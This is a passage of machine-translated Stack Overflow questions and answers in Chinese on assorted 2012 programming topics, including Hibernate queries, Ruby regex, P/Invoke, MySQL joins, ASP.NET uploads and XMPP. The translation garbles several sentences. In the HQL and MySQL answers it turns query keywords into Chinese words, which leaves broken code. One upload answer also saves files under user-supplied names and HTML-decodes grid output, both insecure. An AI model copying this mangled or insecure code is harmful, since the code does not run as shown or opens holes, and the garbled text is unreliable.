   Author author;
}

class Author
{
   @Id
   long id;

   String name;

   @OneToMany
   List<Assign> books;
} 
```

获取作者姓名的所有书籍的查询是什么？还有什么是查询以获取作者姓名的所有书籍名称？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:45:28.397

您只需有两个 OneToMany 关联。您只需要在查询中使用连接，如[Hibernate 文档 over HQL](http://docs.jboss.org/hibernate/core/3.6/reference/en-US/html_single/#queryhql-joins)中所述。

```
select book from Author author 
left join author.books assign
left join assign.book book
where author.name = :name 
```

第二个查询是相同的，除了你只想要书名：

```
select book.name from Author author ... 
```

旁注：您不应该命名您的分配集合`books`或`authors`：它非常令人困惑。命名它`assigns`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:47:39.637

*获取作者姓名的所有书籍的查询是什么？*

来自 b.authors.author.name 的书 b 订单

*什么是获取所有书籍名称作为作者姓名的查询？*

从书 b 中选择 b.title 按 b.authors.author.name 排序

您是否在 Author 和 Book 类中交换了标题和名称？

# ruby - 如何在 Ruby 中为多个单词/短语编写正则表达式？

> ID：10603111
> 
> 赞同：1
> 
> 时间：2012-05-15T14:39:06.487
> 
> 标签：ruby, regex

所以我知道如何找到一个单词关键字就好了：

```
text =~ /keyword1|keyword2|keyword3/i 
```

但是我如何找到短语？例如“天空是蓝色的......但有时它会变成橙色。”

我试着做：

```
text =~ /(the sky is blue)|(orange sky)|(sky is blue but orange)/i 
```

但这没有用。

想法？基本上，我如何将多个由空格分隔的关键字串在一起，并能够找到与这些短语相对应的文本？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:04:41.953

我不确定您所说的“那不起作用”是什么意思。`=~`返回正则表达式找到匹配项的索引：

```
"The sky is blue....but sometimes it turns to orange." =~ /(the sky is blue)|(orange sky)|(sky is blue but orange)/i
# => 0 
```

`0`是“天空是蓝色的”找到匹配项的索引。如果未找到匹配项，则`=~`返回`nil`。`0`在 Ruby 中是“真”和`nil`“假”，所以匹配的结果可以在`if`语句中使用。

如果这些是您正在寻找的确切短语，那么您现有的正则表达式应该可以正常工作。

```
"The sky is green....but sometimes it turns to orange sky." =~ /(the sky is blue)|(orange sky)|(sky is blue but orange)/i
# => 46 
```

您可以在运行正则表达式之前使用[String#squeeze](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-squeeze)方法删除多个空格。

```
"The sky is green....but sky is blue      but orange sometimes.".squeeze!(" ") =~ /(the sky is blue)|(orange sky)|(sky is blue but orange)/i
# => 24 
```

这有帮助吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T14:43:24.410

`\s`如果您不关心其他空白字符，请使用代替空格。**但是，如果您只**需要匹配空格字符，则可以使用空格符号 ( `\u0020`) 的代码：

```
text =~ /(the\u0020sky\u0020is\u0020blue)|(orange\u0020sky)|(sky\u0020is\u0020blue\u0020but\u0020orange)/i 
```

# regex - PowerShell 条件效率：-match 与 -like

> ID：10603114
> 
> 赞同：1
> 
> 时间：2012-05-15T14:39:17.553
> 
> 标签：regex, performance, powershell

我有一个简单的 Powershell 脚本，它使用一些过滤器收集 Exchange 邮件跟踪结果，然后返回主题中带有“*SPAM*”的项目。为此，我采用一组 Microsoft.Exchange.Management.TransportLogSearchTasks.MessageTrackingEvent 对象并将其通过管道传送到检查每个条目的 MessageSubject 属性的“位置”。

我发现当我使用以下内容比较 MessageSubject 属性时，代码需要很长时间（几小时）才能完成约 70,000 条记录：

($_.messagesubject -like '`*SPAM`*')

但是，当我使用以下内容时，完成时间以秒为单位：

($_.messagesubject -match [regex]'^\*SPAM\*.*$')

我正在努力确定前者需要更长处理时间的具体原因。两种方法都不需要循环相同数量的对象吗？逐字符比较（for -like）与编译正则表达式的区别是什么？（用于匹配）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T19:16:10.133

您确定切换运算符是版本之间唯一更改的内容吗？根据以下测试，操作员的性能不是问题。此外，正则表达式是最长的。我也相信您使用的类似模式是错误的，您需要转义星号，因为它们是特殊的通配符（请参阅 $sb4）。

```
PS> $msg = "just a sample spam message for testing"

PS> $sb1 = { 1..70000 | foreach {$msg -match [regex]'^\*SPAM\*.*$' } }
PS> $sb2 = { 1..70000 | foreach {$msg -match 'spam'} }
PS> $sb3 = { 1..70000 | foreach {$msg -like "*spam*" } }
PS> $sb4 = { 1..70000 | foreach {$msg -like "`*spam`*" } }    

PS> (measure-command $sb1).TotalSeconds
8.1869412

PS> (measure-command $sb2).TotalSeconds
6.7244995

PS> (measure-command $sb3).TotalSeconds
7.9287195

PS> (measure-command $sb4).TotalSeconds
6.9678701 
```

# c++ - Mac OSX 下的 TCHAR 和 _tprintf

> ID：10603117
> 
> 赞同：1
> 
> 时间：2012-05-15T14:39:26.813
> 
> 标签：c++, macos

我正在使用 xcode 在 mac osx 下使用 clucene，并且在演示应用程序中遇到了一些问题，也许有人可以帮助我:-)

演示代码带有 'document' 和 'query' 数组：

```
const TCHAR* docs[] = {
  _T("a b c d e"),
  ...
  _T("a c e a b c"),
  NULL
};

const TCHAR* queries[] = {
  _T("a b"),
  ...
  _T("\"a c e\""),
  NULL
}; 
```

用于索引和查询，只要我注释掉 _tprintf 行，例如：

```
_tprintf(_T("Query: %s\n"), qryInfo); 
```

所以 _tprintf 似乎无法被我的系统识别，如果我使用 tprintf，xcode 说没有匹配的函数可以调用 tprintf。

那么如何正确打印 TCHAR 呢？CLucene 需要字段的 TCHAR 名称。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:51:44.477

在 Windows`TCHAR`上，`wchar_t`取决于`char`您的项目设置。

同样，`_tprintf`是其中`wprintf`一个`printf`来匹配字符的选择。

在 OSX 上，你可能不得不自己做出这个选择，也许

```
#define _tprintf    wprintf 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:03:27.253

TCHAR 是一种 Windows 字符类型。在非 Windows 平台上，Clucene 在[config/repl_tchar.h](http://clucene.svn.sourceforge.net/viewvc/clucene/trunk/src/CLucene/config/repl_tchar.h?revision=2088&view=markup)中定义了 TCHAR 类型和相关函数。

要么没有包含该标头，要么项目配置错误。

# asp.net - 如何使用 ASP.NET 获取每个角色的在线用户数

> ID：10603118
> 
> 赞同：1
> 
> 时间：2012-05-15T14:39:26.967
> 
> 标签：asp.net, visual-studio-2010, security, asp.net-membership

我想知道为每个角色登录到我的 ASP.NET 应用程序的用户数量我有一个（管理员）角色和一个（休息）角色我想知道每个角色的在线用户数量而不是整个应用程序这是什么方法做了：

```
Membership.GetNumberOfUsersOnline() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:44:57.340

您需要自己枚举用户。如果你利用

```
Membership.GetAllUsers() 
```

您将获得所有可用用户的集合。然后你可以遍历每个用户并检查`IsOnline`属性以查看用户是否在线。要确定用户的角色，您可以使用[**`Roles`**](http://msdn.microsoft.com/en-us/library/system.web.security.roles.aspx)类中的方法。

例如，如果您有两个角色`admin`和`rest`，并且您想显示每个角色中有多少用户在线，您可以执行以下操作：

```
var adminCount = 0, restCount = 0;
foreach ( var user in Membership.GetAllUsers().Where(u => u.IsOnline) )
    if (Roles.IsUserInRole(user.UserName, "admin"))
        adminCount++;
    else if (Roles.IsUserInRole(user.UserName, "rest"))
        restCount++;

// do something with adminCount and restCount 
```

如果您有更复杂的角色结构或许多角色，您可以使用映射来存储每个角色的计数。逻辑取决于您要完成的工作，这应该提供表达自定义计数逻辑所需的所有部分。

# javascript - 使用 Yahoo API 拖放带有链接锚的容器

> ID：10603120
> 
> 赞同：0
> 
> 时间：2012-05-15T14:39:28.533
> 
> 标签：javascript, drag-and-drop, yui, draggable, yahoo

我修改了优秀的 Yahoo 示例以允许拖放 div 容器。我基本上只是将代码中对“ul”和“li”的所有引用更改为 div 容器的类。

我想允许对画廊中的图像进行重新排序。

如果 div 容器不包含链接，我可以重新排序它们。我怎样才能使这些 div 可拖动？

[问题与从http://yuilibrary.com/yui/docs/dd/list-drag.html](http://yuilibrary.com/yui/docs/dd/list-drag.html)向雅虎示例添加链接锚几乎相同

```
<div id="play">
    <ul id="list1">
        <li class="list1"><a href="#">Item #1</a></li>
        <li class="list1"><a href="#">Item #2</a></li>
        <li class="list1"><a href="#">Item #3</a></li>
        <li class="list1"><a href="#">Item #4</a></li>
        <li class="list1"><a href="#">Item #5</a></li>
    </ul>
</div> 
```

我相信在这种情况下列表项也不能拖动。

所以我的代码如下所示：

```
<div class="alt1" style="padding:6px;" width="100%" align="center" id="play">
    <div style="width:162px; height:166px; margin:5px; float:left" class="list1">
        <a href="album.php?pictureid=147828"><img src="/123.jpg" alt="" border="0" style="padding:6px;" width="130" height="130" /></a>
    </div>
    <div style="width:162px; height:166px; margin:5px; float:left" class="list1">
        <a href="album.php?pictureid=147828"><img src="/123.jpg" alt="" border="0" style="padding:6px;" width="130" height="130" /></a>
    </div>
</div> 
```

如果我添加链接（如上），我只能通过填充拖动 div 容器。如果链接不存在，我可以将图像拖到任何地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T12:22:19.230

我在这里写了一个更完整的答案：[重新排序图片库](https://stackoverflow.com/questions/14475792/reorder-image-gallery/)

简而言之，锚标记默认不是有效的拖动句柄。您可以使用 removeInvalid 更改此设置：

```
dragInstance.removeInvalid('a'); 
```

# ruby-on-rails - 如何在active_admin formtastic中嵌入原始html

> ID：10603124
> 
> 赞同：4
> 
> 时间：2012-05-15T14:39:42.570
> 
> 标签：ruby-on-rails, activeadmin, formtastic

我正在尝试在 active_admin 模型中构建一个带有 formtastic 的表单。问题是我需要直接在表单内部或周围使用某个脚本标记和其他原始 HTML 内容。

我正在使用普通表单块：

```
form do |f|
    f.inputs :name => "User Details", :for => :user do |user_form|
    user_form.input :first_name, :required => true
    ... 
```

如何在两者之间嵌入一个简单的**div**标签？甚至是**脚本**标签？

我考虑过使用 a `render :partial`，但我想先知道上述方法是否可行。谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-26T17:42:06.757

您可以像这样插入 div 或 javascript：

```
 f.form_buffers.last << content_tag(:div, "Div content here")
   f.form_buffers.last << javascript_tag("alert('hi');") 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-01-04T15:46:41.350

在当前的 ActiveAdmin 中，不推荐使用 form_buffers。相反，可以执行以下操作：

```
insert_tag(Arbre::HTML::Div) { content_tag(:span, "foo") } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-05-16T18:15:27.383

活动管理员根据他们的文档在 Formtastic 之上创建了一个 DSL

> [https://github.com/activeadmin/activeadmin/blob/master/docs/5-forms.md](https://github.com/activeadmin/activeadmin/blob/master/docs/5-forms.md)

所以你现在可以这样做：

```
form do |f|
  f.semantic_errors(*f.object.errors.keys)

  import_errors = self.controller.instance_variable_get("@errors")
  if import_errors.present?
    ul class: 'errors' do
      import_errors.each do |e|
        li e
      end
    end
  end
 # ...
end 
```

# c# - 在 CRM 2011 插件中将成员添加到营销列表

> ID：10603129
> 
> 赞同：2
> 
> 时间：2012-05-15T14:40:01.077
> 
> 标签：c#, dynamics-crm, dynamics-crm-2011, crm

我希望有人可以在这里帮助我。我找到了一篇文章，它为您提供了将添加多个实体（成员）添加到营销列表的一小段代码。到现在为止还挺好。我遇到了这个问题。我有一个自定义查找字段，它在营销成员列表中获取另一个营销列表（有联系人、客户或潜在客户）。现在我需要将这些成员迁移（添加）到我的新营销列表中。我的代码：

```
 1\. AddListMembersListRequest request = new AddListMembersListRequest();
  2\. request.ListId = Origmarketing_List_Id.Id;  
  3\. request.MemberIds = new Guid[1];
  4\. request.MemberIds[0] = guid;
  5\. AddListMembersListResponse resp = (AddListMembersListResponse)service.Execute(request); 
```

第 2 行是我从 EntityReference 获得的 ID（查找字段获取另一个营销列表），现在我设置的第三和第四行是我真的很困惑但我仍然确定我会在这里因为我将它设置为listmemberid。在这个例子中，我只有一个原因，我想尝试一下它是如何工作的。第 4 行 bdw 中的 guid 获得了正确的值，它在我的代码顶部声明（我已经将它输出到另一个字段中，只是为了检查它是否获取了正确的值）。当您想添加多个实体时，也有人可以展示您将如何执行此操作吗？谢谢。我正在预操作（创建）上注册我的插件。而且插件本身不会引发任何错误，但它似乎没有在我的新列表中添加任何成员。如果有人能在这里帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-16T06:42:34.043

首先，将事件更改为操作后，因为您还没有创建实体的 GUID，事实上您也没有实体本身，这就是为什么它被称为操作前。要添加多个实体，请尝试传递一个 GUIDs 数组，如下面的代码：

```
 // Setup the CrmConnection and OrganizationService instances
    CrmConnectionInstance = new CrmConnection(ConfigurationConstants.CrmConnectionName);
OrgServiceInstance = new OrganizationService(CrmConnectionInstance);
    // Create the marketing list 
    Guid NewMarketingListId = Guid.Empty; 
    Microsoft.Xrm.Sdk.Entity CurrentList = new Microsoft.Xrm.Sdk.Entity(MarketingListConstants.MarketingListEntityName); 
    CurrentList[MarketingListConstants.MarketingListTypeAttribute] = false; 
    CurrentList[MarketingListConstants.ListNameAttribute] = "NameOfList"; 
    // For contacts, a value of 2 should be used. 
    CurrentList[MarketingListConstants.CreatedFromCodeAttribute] = new OptionSetValue(2); 
    // Actually create the list 
    NewMarketingListId = OrgServiceInstance.Create(CurrentList); 
    // Use the AddListMembersListRequest to add the members to the list 
    List<Guid> MemberListIds = new List<Guid>(); 
    // Now you'll need to add the Guids for each member to the list  
    // I'm leaving that part out as adding values to a list is very basic. 
    AddListMembersListRequest AddMemberRequest = new AddListMembersListRequest(); 
    AddMemberRequest.ListId = NewMarketingListId; 
    AddMemberRequest.MemberIds = memberIds.ToArray(); 
    // Use AddListMembersListReponse to get information about the request execution 
    AddListMembersListResponse AddMemberResponse = OrgServiceInstance.Execute(AddMemberRequest) as AddListMembersListResponse; 
```

# c# - 包装 c++ 函数以在 C# 中使用

> ID：10603135
> 
> 赞同：1
> 
> 时间：2012-05-15T14:40:49.770
> 
> 标签：c#, c++, pinvoke, dllimport

> **可能重复：**
> [对 PInvoke 函数“[…]”的调用使堆栈不平衡](https://stackoverflow.com/questions/2941960/a-call-to-pinvoke-function-has-unbalanced-the-stack)

我正在尝试包装一些用 c++ 编写的函数，以便在 ac# 程序（WPF，或作为控制台应用程序的示例）中使用它们，但会获得运行时异常。

我想这是一个编译问题（无论是 C# 的 c++ 项目）。当我更改 C# 项目的平台目标时，我得到了不同的异常。当平台目标是 x64 我得到

> 试图加载格式不正确的程序。（来自 HRESULT 的异常：0x8007000B）

当我尝试将其编译为 x86 时，我得到：

> 对 PInvoke 函数 'Wrapper!Wrapper.IWrapper::create' 的调用使堆栈失衡。这可能是因为托管 PInvoke 签名与非托管目标签名不匹配。检查 PInvoke 签名的调用约定和参数是否与目标非托管签名匹配。

我在 Windows 7 64 上运行 VS2010。

对于如何解决这个问题的任何想法都会很高兴。

### 这就是我所做的：

c++ 代码。cp:

```
int create(int Handle)
{
    return 1;
} 
```

和 h：

```
#define EXPORT_DLL __declspec(dllexport)

extern "C"
{
EXPORT_DLL int create(int Handle);
} 
```

然后在第二个 C# 项目中，我调用这个 dll，其中 c++ 项目的名称是 wrapAttemptC

```
namespace Wrapper
{
    internal class IWrapper
    {
        const string SHADOW_DLL_NAME = "wrapAttemptC.dll";

        [DllImport(SHADOW_DLL_NAME)]
        public static extern int create(int Handle);
    }
    public class CWW
    {
        public CWW(){}

        public int Connect(int cam)
        {
            return IWrapper.create(cam);
        }
    }
} 
```

然后，我把在c++项目中创建的DLL文件放在这个c#项目和app c#项目（WPF）的bin/Debug中，并尝试调用

```
CWW cww = new CWW();
cww.Connect(5); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:51:02.690

C++ 导出函数的默认调用约定是`cdecl`，但`DllImport`属性的默认调用约定是`WinApi`（默认为`stdcall`）。所以你有一个不匹配的地方，这确实会弄乱你的筹码。尝试在`DllImport`属性中明确说明调用约定、您的 C++ 函数声明，或者更好地说明两者（以便它们匹配）。像这样：

```
EXPORT_DLL __stdcall int create(int Handle); 
```

在您的 C# 项目中：

```
[DllImport(SHADOW_DLL_NAME, CallingConvention = CallingConvention.StdCall)] 
```

# iphone - 在 UITableViewCell 中返回 null UITextView 标记

> ID：10603139
> 
> 赞同：0
> 
> 时间：2012-05-15T14:40:58.907
> 
> 标签：iphone, objective-c, uitextfielddelegate

我在 UITableViewCell 中放置了 10 个 UITextField，并在每个 UITextField 上放置了标签。

我的问题是，我可以访问那些 UITextFields 的标签吗

```
- (void)textFieldDidBeginEditing:(UITextField *)textField? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:46:20.683

> 我的问题是，我可以访问那些 UITextFields 的标签 `-(void)textFieldDidBeginEditing:(UITextField *)textField`吗？

当然。只需使用：

```
textField.tag 
```

为特定字段调用该方法`textFieldDidBeginEditing:`，该字段将在`textField`参数中指定。如果要访问*不同*的字段，则需要获取指向所需字段的指针。您可以执行以下操作：

```
UIView *parent = [textField superview];
UITextField *someOtherField = [parent viewWithTag:theTagOfTheFieldYouWant]; 
```

# mysql - Mysql加入排序

> ID：10603145
> 
> 赞同：3
> 
> 时间：2012-05-15T14:41:17.687
> 
> 标签：mysql, sql

我有两张表说：用户和图书馆。图书馆包含以某种方式分类的书籍；用户也可以选择以某种方式对他的书进行分类。这两个表的结构（和样本数据）如下所示：

## 图书馆

bookid 位置
10 1
12 2
14 3
16 4

## 用户

userid bookid 位置
12669 12 1
12669 10 2

我想要一个查询来返回用户 12669 的所有书籍，按位置排序，即：

**select bookid from user where userid = 12669 group by position**

在它返回这些排序的书籍后，它应该返回图书馆中的其他 bookid（用户中不存在）。不应重复任何 bookid。这些场景的结果将如下所示：

12
10
14
16

换句话说：*图书馆中的所有书籍都应该由这个查询返回，但是用户选择的书籍是根据 user.position 排序的，*

我认为我可能需要某种连接语句。我试过：
**从用户 u 中选择 bookid 右加入库 l on u.bookid = l.bookid where u.userid = 12669 group by u.position**

但是，我得到一个语法错误。解决这个“问题”的最佳方法是什么？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:44:00.270

这应该可以解决问题:)

```
SELECT l.bookid
FROM library l
LEFT OUTER JOIN user u on u.bookid = l.bookid
WHERE u.userid = 12669
ORDER BY isnull(u.position, 99999), l.position 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:58:03.730

首先，您发布的查询在其投影中包含一个不属于所涉及的任何一个表的列名。

其次，您使用的是 GROUP BY，其中排序由 ORDER BY 执行。

第三点：正如@Romil 指出的那样，在 WHERE 子句中对 USER 表的引用会覆盖外连接，并有效地强制执行内连接。因此，您需要从 USER 表的内联视图中进行选择。

最后，要获得您想要的排序顺序，您需要首先对所有 USER.POSITION 进行绑定。此版本的查询使用 IFNULL 为没有连接 USER 记录的任何行分配一个极高的值。因此，它将按所有返回的 USER.POSITION 值排序，然后按 LIBRARY.POSITION 对所有剩余书籍进行排序。

```
select l.bookid 
from ( select * from user
        where userid = 12669 ) u
   right join library l 
     on (u.bookid = l.bookid) 
order by ifnull(u.position, 999999999) , l.position 
```

注意：如果您正在索引[Babel 图书馆，](http://en.wikipedia.org/wiki/The_Library_of_Babel)那么可能有足够的书架来支持超过 999999999 个位置，只需提高该替代值即可。

* * *

> “这对我不起作用。它没有按照我想要的安排返回书名。”

坦率地说，我觉得这很令人惊讶。这是[一个 SqlFiddle](http://sqlfiddle.com/#!2/d606e/2)，它肯定会按照您指定的顺序返回您的示例数据。所以我重复我之前的问题：您发布的表格描述是否与您的实际表格*完全*匹配？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T22:42:38.983

感谢 APC、Romil 和 aF。我终于想出了一个不使用连接的解决方案。这对我有用：

```
(
选择书号
来自用户
其中用户 ID = 12669
按位置排序
)
联合（
选择书号
来自库
)
```

第一个查询从用户中选择已**排序**的bookid，然后**联合**语句从库中选择*所有其他*书籍并将其添加到结果集中。这后一组的安排并不重要。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:48:06.940

```
SELECT library.bookid bookid 
FROM   library 
       LEFT JOIN (SELECT * 
                  FROM   [user] 
                  WHERE  [USER].userid = 12669) users 
         ON [USERs].bookid = library.bookid 
ORDER  BY [USERs].userid DESC, 
          [USERs].position, 
          library.position 
```

# asp.net - asp.net文件上传（如何创建上传文件的超链接，显示在我的gridview中）

> ID：10603151
> 
> 赞同：0
> 
> 时间：2012-05-15T14:41:28.683
> 
> 标签：asp.net, visual-studio, visual-studio-2010, asp.net-controls

下午所有，

我有一个简单的文件上传教程，我已经为我在 Visual Studio 2010 中开发的网站完成了该教程。

我只想通过使文件成为gridview中该文档的链接来增强显示上传文件的gridview。这将使用户能够上传文件并通过按网格视图中的链接来查看文件来查看文件。

到目前为止，这是我的代码...

```
<form id="form1" runat="server">
<div> 
<table style="width: 90%"> 
   <tr> 
      <td style="width: 100px"> Single File Upload:<br />
      <asp:FileUpload ID="FileUpload1" runat="server" /><br />
      <asp:Button ID="buttonUpload" runat="server" Text="Upload" /><br />
<br />
       <asp:GridView ID="UploadedFiles" DataSource="<%# GetUploadList() %>" runat="server" CellPadding="4" ForeColor="#333333" GridLines="None"> 
        <FooterStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
        <RowStyle BackColor="#EFF3FB" />
        <EditRowStyle BackColor="#2461BF" />
        <SelectedRowStyle BackColor="#D1DDF1" Font-Bold="True" ForeColor="#333333" />
        <PagerStyle BackColor="#2461BF" ForeColor="White" HorizontalAlign="Center" />
        <HeaderStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
        <AlternatingRowStyle BackColor="White" />
      </asp:GridView>
    </td>
  </tr>
</table>
</div>
</form> 
```

这是.VB页面

```
Partial Class test
Inherits System.Web.UI.Page

Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    If Not IsPostBack Then
        UploadedFiles.DataBind()
    End If
End Sub

    Protected Function GetUploadList() As String()
    Dim folder As String = Server.MapPath("~/Uploads")
    Dim files() As String = Directory.GetFiles(folder)
    Dim fileNames(files.Length - 1) As String
    Array.Sort(files)

    For i As Integer = 0 To files.Length - 1
        fileNames(i) = Path.GetFileName(files(i))
    Next

    Return fileNames
End Function

 Protected Sub UploadThisFile(ByVal upload As FileUpload)
    If upload.HasFile Then
        Dim theFileName As String = Path.Combine(Server.MapPath("~/Uploads"), upload.FileName)
        If File.Exists(theFileName) Then
            File.Delete(theFileName)
        End If
        upload.SaveAs(theFileName)
    End If
End Sub

Protected Sub buttonUpload_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles buttonUpload.Click
    UploadThisFile(FileUpload1)
    UploadedFiles.DataBind()
End Sub

End Class 
```

我不太确定如何在该`Protected Sub UploadThisFile(ByVal upload As FileUpload)`部分中添加一些额外的代码。

将上传文件中可用的此静态项目列表添加到包含指向这些单个文档的链接的列表的任何帮助都非常有用。

非常感谢，贝蒂

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:24:44.593

以这种方式调整您的代码：

生成标签：

```
Protected Function GetUploadList() As String()

        Dim folder As String = Server.MapPath("~/Uploads")
        Dim files() As String = Directory.GetFiles(folder)
        Dim fileNames(files.Length - 1) As String
        Dim lnk As String = String.Empty
        Array.Sort(files)

        For i As Integer = 0 To files.Length - 1
            lnk = "  <a href=""Uploads/" & files(i).ToString() & """ target=""_blank"">File</a>"
            fileNames(i) = Path.GetFileName(files(i)) & lnk
            lnk = ""
        Next

        Return fileNames

End Function 
```

访问每个 gridview 单元格以解码标记：

```
Protected Sub UploadedFiles_RowDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewRowEventArgs) Handles UploadedFiles.RowDataBound

        If e.Row.RowType = DataControlRowType.DataRow Then

            Dim tcls As TableCellCollection = e.Row.Cells

            For Each tc As TableCell In tcls
                tc.Text = Server.HtmlDecode(tc.Text)
            Next

        End If

End Sub 
```

如果您希望`<a>`在您的文件名上生成“”标签，您可以通过以下方式更改每个文件名：

```
fileNames(i) = "<a href=""Uploads/" & Path.GetFileName(files(i).ToString()) & """ target=""_blank"">" & Path.GetFileName(files(i)) & "</a>" 
```

希望能帮助到你。

# apache-flex - Adobe Air：为什么这个 DataProvider 会产生错误？

> ID：10603153
> 
> 赞同：0
> 
> 时间：2012-05-15T14:41:42.230
> 
> 标签：apache-flex, sqlite, air, flex4, dataprovider

我目前在运行时在第 148 行遇到错误：

```
TypeError: Error #1009: Cannot access a property or method of a null object reference.
    at PlantDB/ResultFill()[C:\Users\usern\Adobe Flash Builder 4.6\PlantDB\src\SQLiteCode.as:148] 
```

第 148 行的代码是：

```
leftList.dataProvider = new ArrayCollection(arr); 
```

在来到第 148 行之前，程序已经用 if (arr != null) 检查了数组 arr 不为空，所以我 100% 确定 arr 不为空。

arr 的内容来自 sqlite：

```
arr = sqls.getResult().data; 
```

数据库中有几个对象，我看到我可以从数据库中获取内容就好了。事实上，在第 148 行之前，我已经通过以下方式检查了 arr 中的内容：

```
var tree:TreeClass_Full = arr[0]; 
```

在调试器中，我检查了上面的树对象，我看到 sqlite 数据库中的所有变量都正确地传输到树对象。事实上，我也检查了 arr[1]、arr[2] 等，并且我看到对象得到了正确的数据。

在我看来，sqlite 和所有这些似乎都不是问题，但是当我将此 Array arr 添加到 var tree:TreeClass_Full = arr[0]; 时，会弹出错误。

我不明白。无法访问空对象引用的属性或方法？导致此错误的 dataProvider 中的隐藏过程是什么？

我的 leftList 在这里：

```
 <s:HGroup width="100%" height="85%" verticalAlign="middle">
            <s:List id = "leftList" width = "45%" height = "95%"
                    dragEnabled="true" dragMoveEnabled="true" dropEnabled="true"
                    itemRenderer="resultRenderer"/>
            <s:List id = "rightList" width = "45%" height = "95%" 
                    dragEnabled="true" dragMoveEnabled="true" dropEnabled="true" 
                    itemRenderer="resultRenderer"/>
        </s:HGroup> 
```

我的 itemRenderer (resultRenderer) 是：

```
<?xml version="1.0" encoding="utf-8"?>
<s:ItemRenderer xmlns:fx="http://ns.adobe.com/mxml/2009" 
                xmlns:s="library://ns.adobe.com/flex/spark" 
                xmlns:mx="library://ns.adobe.com/flex/mx" 
                autoDrawBackground="true">
    <s:HGroup x="5" y="5" width="350" height="150" horizontalAlign="center" verticalAlign="middle">
         <mx:Image id = "resultImage" width="100" height="100"/> 
         <s:TextArea id="resultTextArea" height="141" editable="false"
                    text = "{data.Common_Name}"/> 
    </s:HGroup>
</s:ItemRenderer> 
```

如果有人知道在 dataProvider 期间导致此错误的原因，请提供帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-11-27T18:11:46.580

如上所述：

> 这是不存在的leftList。ResultFill 方法可能在创建 leftList 之前被调用。leftList 确实为空。因为我的 HGroup 位于不同的视图堆栈中（尽管是相同的 .mxml 文件），所以在我选择查看相应的视图堆栈之前它不存在。

# android - XMPP FileTransfer - 为什么字节流协议失败？

> ID：10603154
> 
> 赞同：10
> 
> 时间：2012-05-15T14:41:54.223
> 
> 标签：android, cocoa-touch, proxy, xmpp, openfire

**我的问题：**我正在通过 Android 和 iOS 上的 XMPP 将文件传输到 Spark 客户端（Spark 2.6.3）。我已经在 android 上成功地完成了这个（由于不错的库），但在 iOS 上还没有成功。但是，在*这两种*设备上，我都注意到通过字节流传输失败......

```
<error code="404" type="CANCEL"><item-not-found xmlns="urn:ietf:params:xml:ns:xmpp-stanzas"/><text xmlns="urn:ietf:params:xml:ns:xmpp-stanzas" xml:lang="en">Could not establish socket with any provided host</text></error> 
```

在 Android 上，传输通过使用 ibb 来完成...

```
<iq id="DK1IO-19" to="myUsername@beta.myCompany.co.uk/Spark 2.6.3" type="set"><open xmlns="http://jabber.org/protocol/ibb" block-size="4096" sid="jsi_4740809287923906297" stanza="iq"/></iq> 
```

此外，在 Android 上，当我将文件从 Spark 发送到我的 Android 应用程序时，它似乎可以通过字节流正常工作。

因此，在 iOS 上，我必须自己编写 ibb 连接，但为什么字节流首先会失败？

**完整日志（安卓应用）：**

```
05-15 13:42:04.023: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq id="DK1IO-9" to="myUsername@beta.myCompany.co.uk/123" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"><si xmlns="http://jabber.org/protocol/si"><feature xmlns="http://jabber.org/protocol/feature-neg"><x xmlns="jabber:x:data" type="submit"><field var="stream-method"><value>http://jabber.org/protocol/bytestreams</value><value>http://jabber.org/protocol/ibb</value></field></x></feature></si></iq>
05-15 13:42:04.040: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-10" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.060: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq id="DK1IO-10" to="myUsername@beta.myCompany.co.uk/123" type="result" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="client" name="Smack" type="pc"/><feature var="http://jabber.org/protocol/xhtml-im"/><feature var="http://jabber.org/protocol/muc"/><feature var="http://jabber.org/protocol/bytestreams"/><feature var="http://jabber.org/protocol/commands"/><feature var="http://jabber.org/protocol/si/profile/file-transfer"/><feature var="http://jabber.org/protocol/si"/><feature var="http://jabber.org/protocol/ibb"/></query></iq>
05-15 13:42:04.080: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-11" to="beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#items"></query></iq>
